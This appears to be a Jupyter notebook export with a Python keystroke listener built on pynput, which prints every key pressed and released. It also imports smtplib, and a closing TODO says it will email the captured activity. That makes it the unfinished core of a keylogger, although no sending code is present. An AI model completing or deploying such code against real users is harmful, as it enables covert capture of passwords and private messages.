
# coding: utf-8

# In[ ]:


from pynput import keyboard as Keyboard
import smtplib

# read keyboard activity when a key is pressed
def on_press(key):
    try:
        print('Key \'{}\' was pressed.'.format(key.char))
    except AttributeError:
        print('Special key \'{}\' pressed'.format(key))

# read keyboard activity when a key is released
def on_release(key):
    try:
        print('\'{}\' was released.'.format(key.char))
    except AttributeError:
        print('\'{}\' was released'.format(key))
    
with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
# TODO: send email of activity using SSL


